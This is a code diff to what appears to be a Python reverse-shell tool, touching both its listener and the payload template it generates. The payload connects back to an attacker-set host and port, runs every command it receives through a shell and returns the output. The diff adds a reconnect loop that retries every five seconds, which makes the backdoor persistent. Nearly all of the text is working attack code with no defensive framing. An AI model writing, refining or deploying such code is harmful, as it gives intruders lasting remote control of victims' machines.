@@ -56,7 +56,7 @@ def main(ip: str, port: int) -> None:
         s = socket.socket()
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         s.bind((ip, port))
-        s.listen(5)
+        s.listen(10)
         print(f"{evnt()} Listening for incoming connection...")
         def loop():
             while True:
@@ -91,35 +91,38 @@ import os
 lhost = "{rhost}"
 lport = {rport}
 def connect():
-    s = socket.socket()
-    s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-    try:
-        
-        s.connect((lhost, lport))
-        while True:
-            data = s.recv(1024)
-            command = data.decode("utf-8", errors="ignore")
-            if command.strip() == "kill":
-                break
-            elif command.startswith("cd "):
-                try:
-                    path = data.decode("utf-8")[3:]
-                    os.chdir(path)
-                    s.send(f" Changed directory to {os.getcwd()}".encode())
-                except Exception as l:
-                    s.send(str(l).encode())
-            elif len(data) > 0:
-                proc = subprocess.Popen(data.decode("utf-8"), shell=True, 
-                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
-                                        stdin=subprocess.PIPE)
-                stdout = proc.stdout.read() + proc.stderr.read()
-                s.send(stdout)
-                if not stdout:
-                    s.send(b"Ok")
-    except Exception:
-        pass
-    finally:
-        s.close()
+    while True:
+        s = socket.socket()
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+        try:
+            
+            s.connect((lhost, lport))
+            while True:
+                data = s.recv(1024)
+                command = data.decode("utf-8", errors="ignore")
+                if command.strip() == "kill":
+                    return
+                elif command.startswith("cd "):
+                    try:
+                        path = data.decode("utf-8")[3:]
+                        os.chdir(path)
+                        s.send(f" Changed directory to {os.getcwd()}".encode())
+                    except Exception as l:
+                        s.send(str(l).encode())
+                elif len(data) > 0:
+                    proc = subprocess.Popen(data.decode("utf-8"), shell=True, 
+                                            stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
+                                            stdin=subprocess.PIPE)
+                    stdout = proc.stdout.read() + proc.stderr.read()
+                    s.send(stdout)
+                    if not stdout:
+                        s.send(b"Ok")
+        except Exception:
+            pass
+        finally:
+            s.close()
+        time.sleep(5)
+
 if __name__ == "__main__":
     connect()
 """
